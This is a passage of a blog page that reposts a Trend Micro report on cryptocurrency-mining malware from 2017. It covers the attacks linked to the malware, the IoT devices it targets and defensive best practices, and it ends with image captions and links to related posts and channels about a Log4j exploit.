<p>But we’ve also found that their impact goes beyond performance issues. From January 1 to June 24, 2017, our sensors detected 4,894 bitcoin miners that triggered over 460,259 bitcoin-mining activities, and found that more than 20% of these miners also triggered web and network-based attacks. We even found intrusion attempts linked to a ransomware’s attack vector. The most prevalent of these attacks we saw were:</p>



<ul>
<li><a href="https://www.trendmicro.com/vinfo/de/security/definition/cross-site-scripting-(xss)">Cross-site scripting</a></li>



<li>Exploiting a remote code execution&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/iis-6-0-vulnerability-leads-code-execution/">vulnerability in Microsoft’s Internet Information Server</a>&nbsp;(IIS)</li>



<li>Brute force and default password logins/attacks</li>



<li>Command buffer overflow exploits</li>



<li>Hypertext Preprocessor (PHP) arbitrary code injection</li>



<li><a href="https://www.trendmicro.com/vinfo/de/security/definition/sql-injection">SQL injection</a></li>



<li>BlackNurse&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/denial-of-service-(dos)">denial of service</a>&nbsp;attack&nbsp;</li>
</ul>



<p>These malware can threaten the availability, integrity, and security of a network or system, which can potentially result in disruptions to an enterprise’s mission-critical operations. Information theft and system hijacking are also daunting repercussions. These attacks can also be the conduit from which additional malware are delivered.&nbsp;</p>



<p><a href="https://www.trendmicro.com/vinfo/de/security/threat-intelligence-center/internet-of-things/">Internet of Things</a>&nbsp;(IoT) devices are also in the crosshairs of cryptocurrency-mining malware—from&nbsp;<a href="https://arstechnica.com/security/2014/05/infecting-dvrs-with-bitcoin-mining-malware-even-easier-you-suspected/">digital video recorders</a>&nbsp;(DVRs)/surveillance cameras,&nbsp;<a href="https://www.wired.com/2014/01/spime-watch-linux-darlloz-internet-things-worm/">set-top boxes</a>,&nbsp;<a href="http://www.computerworld.com/article/3119109/security/thousands-of-seagate-nas-boxes-host-cryptocurrency-mining-malware.html">network-attached storage</a>&nbsp;(NAS) devices, and especially routers, given their ubiquity among home and corporate environments. In April 2017, a variant of Mirai&nbsp;<a href="http://www.newsweek.com/botnet-hacking-devices-mine-bitcoin-582404">surfaced</a>&nbsp;with bitcoin-mining capabilities. Mirai’s notoriety sprung from the havoc it wrought in IoT devices, particularly home routers, using them to&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cyber-attacks/a-rundown-of-the-biggest-cybersecurity-incidents-of-2016#WorstTroublemakerMirai">knock high-profile sites offline</a>&nbsp;last year. Over the first three quarters of 2016, we detected a&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/home-routers-mitigating-attacks-that-turn-them-to-zombies/">bitcoin-mining zombie army made up of Windows systems, home routers, and IP cameras</a>.&nbsp;</p>



<p>From January 1 to June 24, 2017, we also observed different kinds of devices that were mining bitcoin, although our telemetry cannot verify if these activities were authorized. We also saw bitcoin mining activities surge by 40% from 1,800 triggered events daily in February to 3,000 in March, 2017.&nbsp;</p>



<p>While bitcoin mining isn’t inherently illegal (at least in many countries), it can entail a compromise if it doesn’t have the owner’s knowledge and consent. We found that machines running Windows had the most bitcoin mining activities, but also of note are:</p>



<ul>
<li>Systems on Macintosh OSes, including iOS (iPhone 4 to iPhone 7)</li>



<li>Devices run on Ubuntu OS, a derivative of Debian Linux OS</li>



<li>Home routers</li>



<li>Environment-monitoring devices, used in data centers</li>



<li>Android-run smart TVs and mobile devices</li>



<li>IP cameras</li>



<li>Print servers</li>



<li>Gaming consoles</li>
</ul>



<p><strong>[READ:&nbsp;</strong><a href="https://www.trendmicro.com/vinfo/de/security/news/internet-of-things/securing-routers-against-mirai-home-network-attacks"><strong>How to secure your router against Mirai and home network attacks</strong></a><strong>]</strong></p>



<h2>Cryptocurrency-mining malware can make victims a part of the problem</h2>



<p>Cryptocurrency-mining malware can impair system performance and risk end users and businesses to information theft, hijacking, and a plethora of other malware. And by turning these machines into zombies, cryptocurrency malware can even inadvertently make its victims part of the problem.&nbsp;</p>



<p>Indeed, their adverse impact to the devices they infect—and ultimately a business’ asset or a user’s data—makes them a credible threat. There is no silver bullet for these malware, but they can be mitigated by following these best practices:</p>



<ul>
<li>Regularly updating your device with the latest patches helps prevent attackers from using vulnerabilities as doorways into the systems</li>



<li>Changing or strengthening the device’s default credentials makes the device less prone to unauthorized access</li>



<li>Enabling the device’s firewall (for home routers), if available, or deploying intrusion detection and prevention systems to mitigate incursion attempts</li>



<li>Taking caution against known attack vectors: socially engineered links, attachments or files from suspicious websites, dubious third-party software/applications, and unsolicited emails&nbsp;</li>
</ul>



<p>IT/system administrators and information security professionals can also consider&nbsp;<a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/endpoint-application-control.html">application whitelisting</a>&nbsp;or similar security mechanisms that prevent suspicious executables from running or installing. Proactively monitoring network traffic helps better identify red flags that may indicate malware infection. Applying the principle of least privilege, developing&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-web-injections">countermeasures against web injections</a>,&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats">securing the email gateway</a>,&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats">implementing best practices for corporate mobile devices</a>, and cultivating a cybersecurity-aware workforce are part of a defense-in-depth approach to reducing an enterprise’s exposure to these threats. Ultimately, however, the security of internet-connected devices against cryptocurrency-mining malware isn’t just a burden for their users. Original design and equipment manufacturers also play&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/internet-things-ecosystem-broken-fix/">vital roles in securing the ecosystems</a>&nbsp;they run in.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener"><img decoding="async" loading="lazy" width="972" height="195" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/image-68.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" class="wp-image-1652" srcset="https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-68.png 972w, https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-68-300x60.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-68-768x154.png 768w" sizes="(max-width: 972px) 100vw, 972px"></a><figcaption class="wp-element-caption"><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener"><code>https://cryptodeeptech.ru/blockchain-attack-vectors/</code></a></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="has-text-align-center">Majority is not Enough: Bitcoin Mining is Vulnerable</h2>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf" target="_blank" rel="noreferrer noopener"><img decoding="async" loading="lazy" width="960" height="655" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/image-67.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" class="wp-image-1649" srcset="https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-67.png 960w, https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-67-300x205.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2022/12/image-67-768x524.png 768w" sizes="(max-width: 960px) 100vw, 960px"></a><figcaption class="wp-element-caption"><a href="https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf" target="_blank" rel="noreferrer noopener"><code>https://cryptodeep.ru/doc/Majority_is_not_Enough_Bitcoin_Mining_is_Vulnerable.pdf</code></a></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/Log4j-Vulnerability" target="_blank" rel="noreferrer noopener">GitHub</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram:&nbsp;https://t.me/cryptodeeptech</a></strong></p>



<p><a href="https://youtu.be/PNDBjoT83zA" target="_blank" rel="noreferrer noopener"><strong>Video: https://youtu.be/PNDBjoT83zA</strong></a></p>



<p><strong><a href="https://cryptodeeptech.ru/log4j-vulnerability" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/log4j-vulnerability</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="576" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/032-1-1024x576.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" class="wp-image-1874" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>
	</div><!-- .entry-content -->

	
